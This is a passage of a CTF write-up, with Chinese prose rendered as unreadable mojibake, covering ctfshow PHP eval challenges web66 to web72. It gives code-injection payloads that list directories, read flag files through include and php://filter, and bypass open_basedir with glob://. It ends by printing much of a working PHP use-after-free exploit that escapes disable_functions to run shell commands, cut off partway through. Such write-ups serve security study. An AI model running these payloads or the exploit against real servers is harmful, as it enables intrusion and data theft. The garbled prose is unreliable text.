</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>æœ¬æ¥ä»¥ä¸ºè¿˜æ˜¯ä¸€æ ·çš„ï¼Œæ²¡æƒ³åˆ°&hellip;</p>
<p><img alt="image-20241128215426797" loading="lazy" src="assets/image-20241128215426797.png"></p>
<p>çœ‹æ¥æˆ‘ä»¬è¦æƒ³åŠæ³•æŸ¥ç›®å½•äº†</p>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨phpä¸­æŸ¥è¯¢ç›®å½•çš„å‡½æ•°</p>
<p>æ¯”å¦‚ scandir()</p>
<p><img alt="image-20241128233043919" loading="lazy" src="assets/image-20241128233043919.png"></p>
<pre tabindex="0"><code>var_dump(scandir(&#39;/&#39;));
</code></pre><p><img alt="image-20241128233314034" loading="lazy" src="assets/image-20241128233314034.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥flagï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«æ¥æŸ¥</p>
<p><img alt="image-20241128233701394" loading="lazy" src="assets/image-20241128233701394.png"></p>
<p>flag.txtå‰é¢è®°å¾—åŠ ä¸Š/</p>
<h4 id="web67">web67<a hidden class="anchor" aria-hidden="true" href="#web67">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è§£æ³•ä¸web66ä¸€è‡´</p>
<h4 id="web68">web68<a hidden class="anchor" aria-hidden="true" href="#web68">#</a></h4>
<p><img alt="image-20241128234343226" loading="lazy" src="assets/image-20241128234343226.png"></p>
<p>è¿™é¢˜è²Œä¼¼åªæ˜¯show_sourceå’Œhighlight_fileç”¨ä¸äº†ï¼Œå…¶ä»–æ²¡ä»€ä¹ˆå˜åŒ–</p>
<p>å¯ä»¥ç›´æ¥ç”¨å‰ä¸¤é¢˜çš„æ–¹æ³•</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥</p>
<pre tabindex="0"><code>c=include(&#39;/flag.txt&#39;) //èµŒ
</code></pre><h4 id="web69">web69<a hidden class="anchor" aria-hidden="true" href="#web69">#</a></h4>
<p><img alt="image-20241128234507588" loading="lazy" src="assets/image-20241128234507588.png"></p>
<p>è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œprint_r() å’Œ var_dump() ä¹Ÿè¢«ç¦ç”¨äº†</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯»æ‰¾å…¶ä»–å¯ä»¥æ‰“å°æ•°ç»„çš„å‡½æ•°æ¥æ‰“å°ç›®å½•</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡var_export()æ¥ä»£æ›¿ï¼Œä»è€Œæ‰“å°ç›®å½•</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));
</code></pre><p><img alt="image-20241129130708792" loading="lazy" src="assets/image-20241129130708792.png"></p>
<p>æ¥ä¸‹è¯»flagå³å¯</p>
<pre tabindex="0"><code>c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=/flag.txt
</code></pre><p>å…¶ä»–çš„è§£æ³•ï¼š</p>
<p>æŸ¥æ–‡ä»¶</p>
<pre tabindex="0"><code>?c=echo implode(&#34;,&#34;,(scandir(&#39;/&#39;))); 
?c=echo json_encode(scandir(&#34;/&#34;));
</code></pre><p>è¯»æ–‡ä»¶</p>
<pre tabindex="0"><code>?c=readgzfile(&#39;/flag.txt&#39;);
</code></pre><h4 id="web70">web70<a hidden class="anchor" aria-hidden="true" href="#web70">#</a></h4>
<p><img alt="image-20241129132128259" loading="lazy" src="assets/image-20241129132128259.png"></p>
<p>è¿™é¢˜æŠŠerror_reporting()å’Œini_set()ç¦ç”¨äº†</p>
<p>è™½ç„¶ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œä¸å½±å“æˆ‘ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•è¯»flag</p>
<h4 id="web71">web71<a hidden class="anchor" aria-hidden="true" href="#web71">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">ä½ è¦ä¸Šå¤©å—ï¼Ÿ
</span></span></span></code></pre></div><ul>
<li>
<p><code>$s = ob_get_contents();</code>ï¼šè·å–è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶èµ‹å€¼ç»™å˜é‡<code>s</code>ã€‚è¾“å‡ºç¼“å†²åŒºåœ¨ PHP ä¸­ç”¨äºä¸´æ—¶å­˜å‚¨è¦è¾“å‡ºåˆ°æµè§ˆå™¨ç­‰çš„å†…å®¹ï¼Œä»¥ä¾¿åœ¨åˆé€‚çš„æ—¶å€™è¿›è¡Œå¤„ç†æˆ–ä¿®æ”¹ã€‚</p>
</li>
<li>
<p><code>ob_end_clean();</code>ï¼šæ¸…ç©ºè¾“å‡ºç¼“å†²åŒºå¹¶å…³é—­å®ƒï¼Œè¿™æ ·å°±æ¸…é™¤äº†åŸå§‹çš„ã€æœªç»å¤„ç†çš„è¾“å‡ºå†…å®¹ï¼Œä»¥ä¾¿åç»­è¿›è¡Œè‡ªå®šä¹‰çš„è¾“å‡ºå¤„ç†ã€‚</p>
</li>
<li>
<p><code>echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</code>ï¼šè¿™è¡Œä»£ç ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹è·å–åˆ°çš„è¾“å‡ºå†…å®¹ï¼ˆå­˜å‚¨åœ¨<code>s</code>ä¸­ï¼‰è¿›è¡Œæ›¿æ¢æ“ä½œã€‚å®ƒä¼šå°†æ‰€æœ‰çš„æ•°å­—å’Œå­—æ¯ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰éƒ½æ›¿æ¢ä¸º<code>?</code>ï¼Œç„¶åå°†å¤„ç†åçš„å†…å®¹è¾“å‡ºåˆ°æµè§ˆå™¨ç­‰è¾“å‡ºç«¯ã€‚</p>
</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™é“é¢˜ä¼šå¯¹å›æ˜¾è¿›è¡Œå¤„ç†ï¼Œè®©æˆ‘ä»¬æ²¡æ³•å¾—åˆ°å›æ˜¾</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨exit()/die()æå‰ç»“æŸç¨‹åºï¼Œä»è€Œä¸æ‰§è¡Œåç»­ä»£ç ç›´æ¥è¿›è¡Œå›æ˜¾</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));exit();
</code></pre><p><img alt="image-20241129144431247" loading="lazy" src="./assets/image-20241129144431247.png"></p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flag.txt&#39;);exit();
</code></pre><p><img alt="image-20241129144855221" loading="lazy" src="./assets/image-20241129144855221.png"></p>
<h4 id="web72">web72<a hidden class="anchor" aria-hidden="true" href="#web72">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">ä½ è¦ä¸Šå¤©å—ï¼Ÿ
</span></span></span></code></pre></div><p>è¿™é“é¢˜ä¸€å¼€å§‹è¿˜ä»¥ä¸ºå’Œä¸Šä¸€é¢˜å·®ä¸å¤š</p>
<p><img alt="image-20241129150755401" loading="lazy" src="./assets/image-20241129150755401.png"></p>
<p>å…ˆè¿›è¡Œç›®å½•æŸ¥è¯¢</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;./&#34;));exit();
</code></pre><p>æ³¨æ„âš ï¸ è¿™é“é¢˜åªæœ‰æƒé™æŸ¥è¯¢çš„å½“å‰ç›®å½•ä¹Ÿå°±æ˜¯<code>./</code></p>
<p>è€Œæ— æ³•è®¿é—®åˆ°å…¶ä»–ç›®å½•çš„æ–‡ä»¶ï¼Œå¦‚ / æ ¹ç›®å½•</p>
<blockquote>
<p>å°è¯•ä½¿ç”¨ scandir() å‡½æ•°æ¥æ‰«ææ ¹ç›®å½•ï¼Œä½†ç”±äº open_basedir é™åˆ¶ï¼Œè¿™ä¸ªæ“ä½œè¢«ç¦æ­¢äº†ã€‚
open_basedir æ˜¯ PHP çš„ä¸€ä¸ªå®‰å…¨é…ç½®æŒ‡ä»¤ï¼Œç”¨æ¥é™åˆ¶ PHP è„šæœ¬åªèƒ½è®¿é—®ç‰¹å®šçš„ç›®å½•ã€‚
å½“å‰é…ç½®åªå…è®¸è®¿é—® /var/www/html/ ç›®å½•åŠå…¶å­ç›®å½•ï¼Œä½†ä¸å…è®¸è®¿é—®å…¶ä»–ç›®å½•ã€‚</p>
<p>åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/Myon5/article/details/140079942</p></blockquote>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨globåè®®ç»•è¿‡open_basediråè®®</p>
<p>payload:ï¼ˆè®°å¾—åˆ æ³¨é‡Šï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// åˆ›å»ºä¸€ä¸ªDirectoryIteratorå¯¹è±¡ï¼Œéå†æ ¹ç›®å½•
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">foreach($a as $f)// éå†æ¯ä¸ªæ¡ç›®
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">{
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">   echo($f-&gt;__toString().&#39; &#39;);// è¾“å‡ºæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªç©ºæ ¼
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ
</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p><img alt="image-20241129151607469" loading="lazy" src="./assets/image-20241129151607469.png"></p>
<p>æˆ–è€…</p>
<p>payloadï¼šï¼ˆè®°å¾—åˆ æ³¨é‡Šï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a = opendir(&#34;glob:///*&#34;); // æ‰“å¼€æ ¹ç›®å½•ï¼Œå¹¶å°†ç›®å½•å¥æŸ„èµ‹å€¼ç»™$a
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">while (($file = readdir($a)) !== false) { // å¾ªç¯è¯»å–ç›®å½•ä¸­çš„æ¯ä¸ªæ¡ç›®
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">    echo $file . &#34;&lt;br&gt;&#34;; // è¾“å‡ºæ¯ä¸ªæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ HTMLæ¢è¡Œæ ‡ç­¾
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">};
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥å‘ç°flag0.php</p>
<p>åˆ©ç”¨uafçš„è„šæœ¬è¿›è¡Œå‘½ä»¤åˆ©ç”¨uafçš„è„šæœ¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ‰§è¡Œï¼š</p>
<p>å°è¯•æ‰§è¡Œls /; cat /flag0.txtå‘½ä»¤</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php
</span></span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="err">pwn(&#34;ls /;cat /flag0.txt&#34;);
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="err">function pwn($cmd) {
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="err">    global $abc, $helper, $backtrace;
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="err">    class Vuln {
</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="err">        public $a;
</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="err">        public function __destruct() { 
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="err">            global $backtrace; 
</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="err">            unset($this-&gt;a);
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="err">            $backtrace = (new Exception)-&gt;getTrace(); # ;)
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="err">            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="err">                $backtrace = debug_backtrace();
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="err">    class Helper {
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="err">        public $a, $b, $c, $d;
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="err">    function str2ptr(&amp;$str, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="err">        $address = 0;
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="err">        for($j = $s-1; $j &gt;= 0; $j--) {
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="err">            $address &lt;&lt;= 8;
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="err">            $address |= ord($str[$p+$j]);
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="err">        return $address;
</span></span></span><span class="line"><span class="ln"> 29</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="err">    function ptr2str($ptr, $m = 8) {
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="err">        $out = &#34;&#34;;
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="err">        for ($i=0; $i &lt; $m; $i++) {
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="err">            $out .= sprintf(&#39;%c&#39;,$ptr &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="err">            $ptr &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="err">        return $out;
</span></span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 39</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="err">    function write(&amp;$str, $p, $v, $n = 8) {
</span></span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="err">        $i = 0;
</span></span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $n; $i++) {
</span></span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="err">            $str[$p + $i] = sprintf(&#39;%c&#39;,$v &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="err">            $v &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="err">    function leak($addr, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="err">        global $abc, $helper;
</span></span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="err">        write($abc, 0x68, $addr + $p - 0x10);
</span></span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="err">        $leak = strlen($helper-&gt;a);
</span></span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="err">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
</span></span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="err">        return $leak;
</span></span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="err">    function parse_elf($base) {
</span></span></span><span class="line"><span class="ln"> 57</span><span class="cl"><span class="err">        $e_type = leak($base, 0x10, 2);
</span></span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="err">        $e_phoff = leak($base, 0x20);
</span></span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="err">        $e_phentsize = leak($base, 0x36, 2);
</span></span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="err">        $e_phnum = leak($base, 0x38, 2);
</span></span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $e_phnum; $i++) {
</span></span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="err">            $header = $base + $e_phoff + $i * $e_phentsize;
</span></span></span><span class="line"><span class="ln"> 65</span><span class="cl"><span class="err">            $p_type  = leak($header, 0, 4);
</span></span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="err">            $p_flags = leak($header, 4, 4);
</span></span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="err">            $p_vaddr = leak($header, 0x10);
</span></span></span><span class="line"><span class="ln"> 68</span><span class="cl"><span class="err">            $p_memsz = leak($header, 0x28);
</span></span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 70</span><span class="cl"><span class="err">            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
</span></span></span><span class="line"><span class="ln"> 71</span><span class="cl"><span class="err">                # handle pie
</span></span></span><span class="line"><span class="ln"> 72</span><span class="cl"><span class="err">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
</span></span></span><span class="line"><span class="ln"> 73</span><span class="cl"><span class="err">                $data_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 74</span><span class="cl"><span class="err">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
</span></span></span><span class="line"><span class="ln"> 75</span><span class="cl"><span class="err">                $text_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 76</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 77</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 78</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="err">        if(!$data_addr || !$text_size || !$data_size)
</span></span></span><span class="line"><span class="ln"> 80</span><span class="cl"><span class="err">            return false;
